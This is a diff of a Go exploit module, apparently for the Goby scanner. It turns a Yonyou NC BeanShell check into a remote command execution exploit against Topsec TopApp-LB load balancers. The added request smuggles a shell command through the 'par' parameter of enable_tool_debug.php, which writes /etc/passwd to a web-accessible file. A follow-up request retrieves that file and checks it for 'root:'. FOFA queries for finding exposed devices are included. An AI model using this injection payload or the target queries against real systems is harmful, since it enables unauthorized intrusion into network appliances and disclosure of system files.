@@ -6,14 +6,14 @@ import (
 
 func init() {
 	expJson := `{
-  "Name": "用友NC BeanShell RCE",
+  "Name": "天融信 TopApp-LB enable_tool_debug.php 远程命令执行漏洞",
   "Description": "",
   "Product": "",
   "Homepage": "",
   "DisclosureDate": null,
   "Author": "清晨",
-  "FofaQuery": "icon_hash=\"1085941792\" || product=\"Yonyou-UFIDA-NC\"",
-  "GobyQuery": "icon_hash=\"1085941792\" || product=\"Yonyou-UFIDA-NC\"",
+  "FofaQuery": "app=\"天融信-TopApp-LB-负载均衡系统\" || product=\"天融信-TopApp-LB-负载均衡系统\"",
+  "GobyQuery": "app=\"天融信-TopApp-LB-负载均衡系统\" || product=\"天融信-TopApp-LB-负载均衡系统\"",
   "Level": "3",
   "Impact": "",
   "Recommendation": "",
@@ -30,7 +30,7 @@ func init() {
     {
       "Request": {
         "method": "GET",
-        "uri": "/servlet/~ic/bsh.servlet.BshServlet",
+        "uri": "/acc/tools/enable_tool_debug.php?val=0&tool=1&par=127.0.0.1' | cat /etc/passwd > ../../abctest.txt |'",
         "follow_redirect": true,
         "header": {},
         "data_type": "text",
@@ -51,7 +51,38 @@ func init() {
             "type": "item",
             "variable": "$body",
             "operation": "contains",
-            "value": "BeanShell",
+            "value": "",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": []
+    },
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "/abctest.txt",
+        "follow_redirect": true,
+        "header": {},
+        "data_type": "text",
+        "data": ""
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          },
+          {
+            "type": "item",
+            "variable": "$body",
+            "operation": "contains",
+            "value": "root:",
             "bz": ""
           }
         ]
@@ -107,7 +138,7 @@ func init() {
   "CVSSScore": "",
   "Translation": {
     "CN": {
-      "Name": "用友NC BeanShell RCE",
+      "Name": "天融信 TopApp-LB enable_tool_debug.php 远程命令执行漏洞",
       "Product": "",
       "Description": "",
       "Recommendation": "",
@@ -116,7 +147,7 @@ func init() {
       "Tags": []
     },
     "EN": {
-      "Name": "yonyou NC BeanShell RCE",
+      "Name": "TopSec-LB rce",
       "Product": "",
       "Description": "",
       "Recommendation": "",
